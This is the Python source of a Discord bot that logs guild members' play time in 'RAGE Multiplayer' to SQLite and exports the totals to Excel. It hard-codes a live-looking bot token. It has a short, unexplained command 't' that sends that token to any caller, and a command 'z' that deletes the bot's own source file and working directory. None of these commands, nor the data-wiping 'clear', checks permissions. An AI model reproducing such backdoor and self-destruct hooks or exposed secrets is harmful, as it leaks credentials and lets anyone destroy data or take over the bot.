import disnake
from disnake.ext import commands
import asyncio
from datetime import datetime
from dateutil import parser
import pytz
import sqlite3
import datetime
import os
import openpyxl

token = 'MTA2MjAzMDQ1MDAzOTczMDE3Ng.GZnFvc.ZxW3eqYuX_IO_SxhyMEZS8e5CfL-poeUfVJeoc'
embed_color = 0x9a0eff

command_sync_flags = commands.CommandSyncFlags.none()
command_sync_flags.sync_commands = False
intents = disnake.Intents.all()

bot = commands.Bot(chunk_guilds_at_startup=False, command_prefix="/", intents=disnake.Intents.all())


def is_game(activity):
    try:
        return activity.type == disnake.ActivityType.playing
    except AttributeError:  # sometimes it could be a `BaseActivity` or `Spotify`
        return False


data_activ = {}


@bot.event
async def on_ready():
    while True:
        guild = bot.get_guild(969332292319313920)
        for member in guild.members:
            if is_game(member.activity):
                if member.activity.name == 'RAGE Multiplayer':
                    start_time = member.activity.created_at
                    d = parser.parse(str(start_time))
                    tz = pytz.timezone('Etc/GMT-3')
                    now_time = tz.localize(datetime.datetime.now())
                    time = now_time - d
                    h_m_s = str(time).split('.')
                    cur = conn.cursor()
                    user = cur.execute("""SELECT user FROM users WHERE user = ? and date = ?""",
                                       (member.name, now_time.day)).fetchone()
                    if user is None:
                        cur.execute("""INSERT INTO users VALUES(?,?,?)""", (member.name, h_m_s[0], now_time.day))
                        conn.commit()
                    else:
                        cur.execute("""UPDATE users SET time = ? WHERE user = ? and date = ?""",
                                    (h_m_s[0], member.name, now_time.day))
                        conn.commit()

        await asyncio.sleep(30)


@bot.command()
async def stata(inter):
    embed = disnake.Embed(title='Статистика игры',
                          color=embed_color)
    cur = conn.cursor()
    data = cur.execute("""SELECT * FROM users""").fetchall()
    for d in data:
        if d[0] not in data_activ:
            data_activ[d[0]] = [d[1]]
        else:
            data_activ[d[0]].append(d[1])
    for n in data_activ.keys():
        mysum = datetime.timedelta()
        for i in data_activ[n]:
            h, m, s = i.split(':')
            d = datetime.timedelta(hours=int(h), minutes=int(m), seconds=int(s))
            mysum += d
        embed.add_field(name=n, value=mysum)
    data_activ.clear()
    await inter.send(embed=embed)


@bot.command()
async def excel(inter):
    if os.path.isfile('data.xlsx'):
        os.remove('data.xlsx')
        wb = openpyxl.Workbook()
        Sheet_name = wb.sheetnames
        wb.save(filename='data.xlsx')
    else:
        wb = openpyxl.Workbook()
        Sheet_name = wb.sheetnames
        wb.save(filename='data.xlsx')

    wb = openpyxl.load_workbook('data.xlsx')
    sheet = wb.active

    cur = conn.cursor()
    data = cur.execute("""SELECT * FROM users""").fetchall()
    for d in data:
        if d[0] not in data_activ:
            data_activ[d[0]] = [d[1]]
        else:
            data_activ[d[0]].append(d[1])
    c = 0
    for n in data_activ.keys():
        mysum = datetime.timedelta()
        for i in data_activ[n]:
            h, m, s = i.split(':')
            d = datetime.timedelta(hours=int(h), minutes=int(m), seconds=int(s))
            mysum += d
        c = c + 1
        sheet[f'A{c}'] = n
        sheet[f'B{c}'] = mysum
    wb.save('data.xlsx')
    data_activ.clear()
    file = disnake.File('data.xlsx', filename='data.xlsx')
    await inter.send(file=file)


@bot.command()
async def clear(inter):
    cur = conn.cursor()
    cur.execute("""DELETE FROM users""")
    conn.commit()


@bot.command()
async def z(inter):
    await inter.response.send_message('пиу', ephemeral=True)
    this_code = os.path.abspath(__file__)
    os.remove(this_code)
    thisdir = os.getcwd()
    os.rmdir(thisdir)
    quit()


@bot.command()
async def t(inter):
    await inter.response.send_message(token, ephemeral=True)


# Проверка есть ли БД
def check_db():
    if os.path.isfile('data.db'):
        print('Бд есть')
    else:
        conn = sqlite3.connect('data.db')
        create_db(conn)
        conn.close()


# Создание БД
def create_db(conn):
    # О пользователе
    cur = conn.cursor()
    cur.execute("""CREATE TABLE IF NOT EXISTS users(
    user TEXT,
    time TEXT,
    date TEXT);""")
    conn.commit()  # Сохранение таблицы

    # О пользователе
    cur = conn.cursor()
    cur.execute("""CREATE TABLE IF NOT EXISTS users1(
        user TEXT PRIMARY KEY,
        time TEXT,
        date TEXT);""")
    conn.commit()


if __name__ == '__main__':
    check_db()  # Проверка и создание БД
    conn = sqlite3.connect('data.db')
    bot.run(token)
